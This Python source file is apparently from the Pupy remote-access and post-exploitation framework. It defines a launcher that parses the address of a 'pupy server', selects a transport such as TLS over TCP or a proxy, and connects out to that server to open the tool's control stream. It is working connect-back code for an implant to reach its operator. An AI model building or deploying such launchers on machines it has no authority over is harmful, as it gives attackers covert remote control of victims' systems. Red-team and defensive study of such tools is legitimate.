# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from ..base_launcher import *

class SimpleLauncher(BaseLauncher):
	""" simply launch a transport """
	def init_argparse(self):
		self.arg_parser = LauncherArgumentParser(prog="simple", description=self.__doc__)
		self.arg_parser.add_argument('--host', metavar='<host:port>', required=True, help='host:port of the pupy server to connect to')
		self.arg_parser.add_argument('--transport', choices=[x for x in network.conf.transports.iterkeys()], default="tcp_ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
		self.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex for proxy transports: proxy_addr=192.168.0.1 proxy_port=8080 proxy_type=HTTP")
	def parse_args(self, args):
		self.args=self.arg_parser.parse_args(args)
		self.rhost, self.rport=None,None
		tab=self.args.host.rsplit(":",1)
		self.rhost=tab[0]
		if len(tab)==2:
			self.rport=int(tab[1])
		else:
			self.rport=443
		self.set_host("%s:%s"%(self.rhost, self.rport))
	def iterate(self):
		if self.args is None:
			raise LauncherError("parse_args needs to be called before iterate")
		logging.info("connecting to %s:%s using transport %s ..."%(self.rhost, self.rport, self.args.transport))
		opt_args=utils.parse_transports_args(' '.join(self.args.transport_args))
		t=network.conf.transports[self.args.transport]
		client_args=t['client_kwargs']
		transport_args=t['client_transport_kwargs']
		for val in opt_args:
			if val.lower() in t['client_kwargs']:
				client_args[val.lower()]=opt_args[val]
			elif val.lower() in t['client_transport_kwargs']:
				transport_args[val.lower()]=opt_args[val]
			else:
				logging.warning("unknown transport argument : %s"%tab[0])
		logging.info("using client options: %s"%client_args)
		logging.info("using transports options: %s"%transport_args)
		try:
			client=t['client'](**client_args)
		except Exception as e:
			#at this point we quit if we can't instanciate the client
			raise SystemExit(e)
		s=client.connect(self.rhost, self.rport)
		stream = t['stream'](s, t['client_transport'], transport_args)
		yield stream

